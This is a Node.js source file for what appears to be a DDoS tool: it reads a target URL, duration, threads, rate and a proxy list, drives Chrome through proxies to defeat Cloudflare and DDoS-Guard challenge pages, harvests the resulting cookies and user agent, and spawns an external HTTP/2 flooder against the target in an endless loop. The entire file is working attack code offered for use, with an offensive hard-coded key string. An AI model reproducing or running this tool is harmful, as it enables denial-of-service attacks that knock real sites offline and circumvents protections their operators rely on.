const Browser = require('./app/browser');
const logger = require('./helpers/logger');

const cloudflare = require('./modules/cloudflare');
const ddosguard = require('./modules/ddosguard');
// SOLVER MODULES //

const cluster = require('cluster');
const fs = require('fs');
const { spawn } = require('child_process');

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[4];
const rateT = process.argv[5];
const proxyT = process.argv[6];

const proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n')

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function flooder(proxy, cookies, useragent) {
   /* const floodArgs = [
        urlT,
        timeT,
        rateT,
        proxy,
        7000,
        useragent,
        cookies
    ] */

    const floodArgs = [
      "-u",
      urlT,
      "-k",
      "adolf",
      "-r",
      rateT,
      "-n",
      150,
      "-t",
      10,
      "-m",
      10,
      "-s",
      timeT,
      "-c",
      cookies,
      "-h",
      useragent,
      "-1",
      proxy
    ]
  
    console.log("\n--------------------------\nArguments sent:", floodArgs.join(' '), '\n--------------------------\n');

    const starts = spawn('./h2', floodArgs);

    starts.on('data', (data) => {  });
    starts.on('exit', (code, signal) => { starts.kill(); });
}


async function run(proxy) {
    const browser = await new Browser({
        proxy: 'http://' + proxy,
        args: [
            '--no-sandbox',
            '--viewport-size 1920, 1080',
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--use-fake-device-for-media-stream',
            '--use-fake-ui-for-media-stream',
            '--start-maximized'
        ],
        headless: false,
        executablePath: "/usr/bin/google-chrome"
    });

    try {
        await browser.launch();

        const pid = await browser.version();

        logger.log(`[spectrum/#${pid.pid}] new browser instance >> ${proxy}`)
        await browser.navigate(urlT);

        await browser.sleep(20000);

        const content = await browser.content();

        if (content.includes(`"summary":{"failedUrl":"${urlT}`)) {
            logger.log(`[spectrum/#${pid.pid}] ${proxy} >> dead`)

            await browser.close();

            const proxy1 = proxies[Math.floor(Math.random() * proxies.length)];
            run(proxy1);
            return;
        }

        if (await browser.title() === 'Just a moment...') {

            await cloudflare.solver(browser, pid, proxies)

        } else if (await browser.title() === 'DDoS-Guard') {

            await ddosguard.solver(browser, pid, proxies)
        }

        const title = await browser.title();
        const cookies = await browser.cookies();
        const useragent = await browser.userAgent();

        if (title === 'Just a moment...' || title === 'DDoS-Guard') {
            logger.log(`[spectrum/#${pid.pid}] ${proxy} >> dead`)

            await browser.close();

            const proxy1 = proxies[Math.floor(Math.random() * proxies.length)];
            run(proxy1);
            return;;
        }

        logger.log(`[spectrum/#${pid.pid}] browser got title >> ${(title !== "") ? title : "[ ] Title is empty"}`);
        logger.log(`[spectrum/#${pid.pid}] browser got cookies >> ${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`);
        
        const lockpidor = await flooder(proxy, cookies, useragent);

        await browser.close();

        const proxy2 = proxies[Math.floor(Math.random() * proxies.length)];
        run(proxy2);


    } catch (error) {
        //console.error(error);
        await browser.close();

        const proxy3 = proxies[Math.floor(Math.random() * proxies.length)];
        await run(proxy3);
    }
}

for (let i = 0; i < threadsT; i++) {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];

    run(proxy);
}